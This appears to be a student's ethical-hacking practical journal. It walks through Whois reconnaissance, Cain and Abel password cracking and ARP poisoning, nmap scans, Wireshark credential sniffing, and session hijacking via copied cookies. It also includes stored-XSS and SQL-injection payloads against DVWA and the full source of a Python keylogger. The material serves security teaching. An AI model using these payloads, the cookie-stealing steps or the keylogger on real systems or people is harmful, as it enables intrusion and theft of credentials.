@@ -1,0 +1,502 @@
+Practical No.1
+
+Aim:- Use Google and Whois for Reconnaissance.
+
+Step 1: Open the WHO.is website ( https://who.is/ ) :
+
+
+
+Step 2: Enter the website name and hit the “Enter button”. (https://www.ckthakurcollege.net/ )
+
+
+
+
+
+Step 3: Show you information about ( https://www.ckthakurcollege.net/ ) : 
+
+
+
+
+
+Second Website: https://www.flipkart.com/
+
+Step1: Open the WHO.is website
+Step 2: Enter the website name and hit the “Enter button”.
+Step 3: Show the information about https://www.flipkart.com/
+
+
+
+
+
+
+
+Practical No. 2
+
+Aim :- Use CrypTool to encrypt and decrypt passwords using RC4 algorithm.
+
+1.Open the CrypTool Application (1.4.42) : 
+
+
+
+2.Click on File>New>Save it>Add text to encrypt :
+
+
+
+3.Now in toolbar go to Encrypt/Decrypt>Symmetric(modern)>RC 4 Algorithm
+Provide the Key Entry for RC 4 :
+
+
+4.Click on Encrypt button :
+
+
+
+5.Now with the encrypted window selected, click on toolbar>Encrypt/Decrypt>Symmetric(modern)>RC 4 
+Provide the same key , then click on Decrypt button :
+
+
+
+
+Practical No. 3
+
+Aim: - Use Cain and Abel for cracking Windows account password using Dictionary attack and to decode wireless network passwords
+
+1.Download and install: 
+“Winpcap”: https://www.winpcap.org/install/ 
+“Cain and Abel” (v4.9.56): https://web.archive.org/web/20190601183155/http://www.oxid.it/cain.html 
+
+2.Open Cain and Abel and select Hash Calculator:
+
+
+
+3.Enter any TEXT in “Text to Hash” Field > Click on “Calculate -> Copy the Hash Value
+Select the text from C:\Program Files (x86)\Cain\Wordlists folder:
+
+
+
+
+4.Now, Select “Cracker” TAB > Select “MD5 Hashes” from LEFT WINDOW Click on “+” to ADD New Hash to the LIST
+
+
+
+●Dictionary Attack:
+
+5.Right Click on the Value & Select the “Dictionary Attack” →
+
+
+
+6.Now Right click below File column > Add to list > then select the C:\Program Files (x86)\Cain\Wordlists file> then click on start button
+
+
+
+
+
+
+
+●Bruteforce Attack:
+
+1.Select Brute-Force attack now> Start:
+
+
+
+
+
+
+
+Practical No. 4
+
+Aim:- Run and analyse the output of following commands in windows – ifconfig, ping, netstat, traceroute
+
+1.ifconfig (ipconfig):
+
+
+
+2.ping: 
+
+
+
+
+3.netstat:
+
+
+
+4.traceroute (tracert): 
+
+
+
+
+Practical No. 5
+
+Aim: - Perform ARP Poisoning in Windows
+
+1.Download and install: 
+“Winpcap”: https://www.winpcap.org/install/ 
+“Cain and Abel” (v4.9.56): https://web.archive.org/web/20190601183155/http://www.oxid.it/cain.html 
+
+2.Open “Cain & Abel” > Click “Configure -> Make Changes
+Click on Arp poison routing section > Use Arp request packets >Apply:
+
+
+
+3.Now, Select “Sniffer” TAB > Click On ICON Start/Stop APR -> Again the Bottom, Select “Hosts” TAB > “ + ” to ADD ICON to Scan for Hosts
+
+
+4.“Mac Address Scanner” Window > Select Target According to your Network, Here we’ll be looking for 2 Hosts Specifically > Check “All Test” CHECKBOX > Click on “OK → Shortly after Scanning, All HOST will be shown
+
+
+
+
+5.Switch TAB “APR” > “+” to ADD SCANNED HOST. Select Target 2 Hosts > Click on “OK”
+
+
+
+
+6.Toggle “Start/Stop APR” To Change STATUS from “IDLE” To “Poisoning”
+
+
+
+
+
+7.From Both HOST “ping” each Other → After Check The APR Activity →
+(HOST-1 ➔ “172.16.0.130”)
+(HOST-2 ➔ “172.16.0.131”)
+
+
+
+
+
+8.NOW, Switch TAB “Passwords” → Select “HTTP” from LEFT WINDOW → Visit any Not Secure (*http) Login Site and Login with dummy data.
+(eg.🔗- http://testphp.vulnweb.com/login.php )
+(http://demo.t3-framework.org/joomla30/index.php/en/joomla-pages/sample- page-2/login-page ) →
+
+
+
+
+
+
+
+
+
+9. Go Back to the Software Check for the Records →
+
+
+
+
+Practical No. 6
+
+Aim: - Use NMap scanner to perform port scanning of various forms – ACK, SYN, FIN, NULL, XMAS
+
+1.ACK-sA (TCP ACK Scan):
+
+Command: nmap -sA -T4 scanme.nmap.org
+
+
+
+
+
+
+2.SYN Scan:
+
+Command: nmap -p 22,113,139 scanme.nmap.org
+
+
+
+
+
+
+3.FIN Scan:
+
+Command: nmap -sF -T4 scanme.nmap.org
+
+
+
+
+
+
+
+
+
+
+
+4.NULL Scan:
+
+Command: nmap -sN -p 22 scanme.nmap.org
+
+
+
+
+
+
+
+
+5.XMAS Scan:
+
+Command: nmap -sX -T4 scanme.nmap.org
+
+
+
+
+
+
+Practical No. 7
+
+Aim: - Use Wireshark (Sniffer) to capture network traffic and analyze
+
+1.Open Wireshark and select your Connection.
+
+
+
+
+
+
+2.Open any http website and add display filter as http. (http://testasp.vulnweb.com/Login.asp )
+
+
+
+3.Fill the form on the website
+
+
+
+
+4.Search for POST request in wireshark then right click on it >> Follow >> Tcp Stream :
+
+
+
+(Username and Password will be visible here with names like tfUName=username&tfUPass=password)
+
+
+
+Practical No. 9
+
+Aim: - Simulate persistent cross-site scripting attack
+
+Pre-requisites:
+
+❖Xampp: https://www.apachefriends.org/download.html  
+❖DVWA Zip: https://sourceforge.net/projects/dvwa.mirror/ 
+
+Steps:
+
+1.Open XAMPP Control Panel & Start Apache, MySQL Server
+
+
+
+2.Open Any Browser & Paste Link in the Address Bar, To Check the Working “http://localhost/dashboard/” →
+
+
+
+
+3.Go to “DVWA\config\config.php.dist” & Rename File To “config.php” →
+
+
+
+4.Open the File with Notepad →
+
+
+
+5.Now, Make Changes according to the $_DVWA[ ‘db_user’ ]=”root” ; 
+$_DVWA [ ‘db_password’ ] = “ ” ;   →  CTRL  S
+
+
+
+
+6.Go to Xampp Folder and Paste DVWA Folder →
+
+
+
+7.Now, try running the “setup.php” file of DVWA by Any Favourite Browser
+“localhost/phpmyadmin/DVWA/setup.php” → “Create / Reset Database”.
+
+
+
+
+
+
+
+8.Now, Set the Security as “LOW” in DVWA Security Section -> Submit.
+
+
+
+9.Select XSS Stored ⟶ Fill Name & Write Script Code in Message ⟶
+<script> alert("Hello, I’m Zombie!"); </script>
+
+
+
+
+
+10.Similarly, we can fetch Cookies Data ⟶ <script> alert(document.cookie); </script>
+
+
+
+11.After Clicking OK, Change the DVWA Security to Impossible, The ATTACK will be Unsuccessful 🔒 →
+
+
+
+
+
+
+
+
+
+Practical No. 10
+
+Aim: - Session Impersonation using Firefox & Tamper Data, Cookie Editor add-ons.
+
+Steps:
+
+1.Open Mozilla Firefox
+2.Go to Extension Market (add-on) and download below add-ons →
+Tamper data: 🔗 https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/ 
+Cookie Editor: 🔗 https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/ 
+
+
+
+
+3.After Adding both add-ons on the Chrome, Open Link in NEW TAB
+ (🔗 → https://www.techpanda.org/ )
+Use the following credentials to login: (email - “admin@google.com”  |  password - “Password2010”) → “Remember Me” → Submit Button → Dashboard →
+
+
+
+
+4.Now, go to the Cookie Editor add-on & In PHPSESSID Copy Paste the ID:
+
+
+
+
+
+5.Now, Go to Tamper Data Add-ons & Start it by Clicking “YES” →
+
+
+
+6.Now open the new tab -> www.techpanda.org and append it with /index.php -> www.techpanda.org/index.php :
+
+
+
+     Click on OK:
+	
+
+
+
+
+7.Now, Paste the Copied Cookie after “PHPSESSID =” and Click “OK” →
+
+
+
+
+8.Repeat the STEP 6 & 7.  But, Append the URL with “/dashboard.php” and 
+Paste the Copied Cookie after “PHPSESSID = ” in Cookie & Click “OK”  →
+
+
+
+
+
+
+9.After Clicking OK, you’ll see the logged dashboard without logging in →
+
+
+
+
+
+
+
+Practical No. 11
+
+Aim: - Perform SQL injection attack
+
+Pre-requisites:
+
+❖Xampp: https://www.apachefriends.org/download.html  
+❖DVWA Zip: https://sourceforge.net/projects/dvwa.mirror/ 
+
+Steps:
+
+1.Open the Xampp control panel and start the Apache and MySQL server:
+
+
+
+2.Open Any Browser & Paste Link in the Address Bar to check the working
+(http://localhost/dashboard/ ):
+
+
+3.Go to “DVWA\config\config.php.dist” & Rename File To “config.php”:
+
+
+
+4.Open the file with Notepad:
+
+
+
+5.Now, Make Changes according to the $_DVWA[ 'db_user' ]     = ‘root’;
+$_DVWA[ 'db_password' ] = ''; -> Save it:
+
+
+6.Now copy the DVWA Folder and go to Xampp\phpMyAdmin and paste the folder there:
+
+
+
+7.Now, try running the “setup.php” file of DVWA by any favourite Browser
+http://localhost/phpmyadmin/digininja-DVWA-947d5d3/setup.php   ,then click on “Create / Reset Database”
+
+
+
+
+
+8.Login using username = “admin” and password= “password” credentials:
+
+
+
+9.Now, Set the Security as “LOW” in DVWA Security Section-> Submit:
+
+10.Click on SQL Injection and enter User ID as “1”: 
+
+
+
+11.Try User ID as (a ' or' '='):
+
+
+
+12.Try User ID as ( 1* ):
+
+13.Try User ID as ( 1= 1 ):
+
+
+
+14.Try User ID as ( 2# ):
+
+
+
+
+Practical No. 12
+
+Aim: - Create a simple keylogger using python
+
+Steps:
+
+1.Open Command Prompt, Install pynput using “pip install pynput”:
+
+
+
+2.Create a Folder in DESKTOP > Rename it as “EH”:
+
+3.Go to “\Desktop\EH” > Create 2 Files as “keylog.py” & “key_log.txt”:
+
+
+
+4.Python Code (keylog.py):
+
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = r"C:\Users\Admin\Desktop\EH"
+logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(format(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+5.Run the code and type random keys -> close the idle -> check “key_log.txt”:
+
+
+
